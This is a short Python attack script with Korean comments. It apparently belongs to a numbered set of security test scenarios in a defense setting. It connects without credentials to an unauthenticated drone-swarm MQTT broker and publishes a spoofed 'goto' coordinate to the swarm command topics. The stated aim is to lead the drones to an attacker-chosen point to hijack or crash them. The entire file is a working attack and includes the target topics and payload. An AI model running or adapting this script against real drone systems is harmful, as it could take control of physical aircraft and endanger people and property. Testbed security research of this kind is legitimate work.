"""
S5 - MQTT 드론 스웜 브로커 장악 : 군집 GPS 스푸핑
=================================================
목표(방산 맥락): 인증/ACL/TLS 가 없는 스웜 MQTT 브로커에 접속하여
군집 전체 토픽(swarm/+/cmd)에 GPS 스푸핑 좌표를 브로드캐스트,
드론 군집을 공격자가 지정한 지점으로 유도(납치/충돌)한다.

기법:
  1) 무인증 접속 후 토픽 구조 파악
  2) swarm/all/cmd 에 goto:<원거리 좌표> 발행 → 군집 유도
"""
import sys
import json
import time
import paho.mqtt.client as mqtt

def run(broker="mqtt", port=1883):
    result = {"scenario": "S5_mqtt_swarm", "target": f"{broker}:{port}",
              "steps": []}
    connected = {"ok": False, "rc": None}

    def on_connect(c, u, f, rc):
        connected["ok"] = (rc == 0)
        connected["rc"] = rc

    c = mqtt.Client(client_id="attacker-01")
    c.on_connect = on_connect
    try:
        c.connect(broker, port, 10)   # 무인증 접속 시도
        c.loop_start()
        time.sleep(1.0)
    except Exception as e:
        result["steps"].append({"action": "connect", "error": str(e)})
        result["success"] = False
        result["impact"] = "브로커 접속 실패(차단/인증 필요)"
        return result

    result["steps"].append(
        {"action": "anonymous_connect", "connected": connected["ok"],
         "rc": connected["rc"]})

    published = 0
    if connected["ok"]:
        # 군집 전체에 GPS 스푸핑 좌표 발행
        spoof = "goto:39.2,125.7"    # 홈(37.5,126.9)에서 크게 이탈
        for topic in ["swarm/all/cmd", "swarm/uav01/cmd", "swarm/uav02/cmd"]:
            info = c.publish(topic, spoof, qos=1)
            info.wait_for_publish()
            published += 1
            result["steps"].append(
                {"action": "publish_spoof", "topic": topic, "payload": spoof})
    c.loop_stop()
    c.disconnect()

    result["success"] = connected["ok"] and published > 0
    result["impact"] = (f"무인증 접속 + 스푸핑 좌표 {published}건 발행 → 군집 유도"
                        if result["success"] else "발행 실패/차단")
    return result


if __name__ == "__main__":
    b = sys.argv[1] if len(sys.argv) > 1 else "mqtt"
    print(json.dumps(run(b), ensure_ascii=False, indent=2))
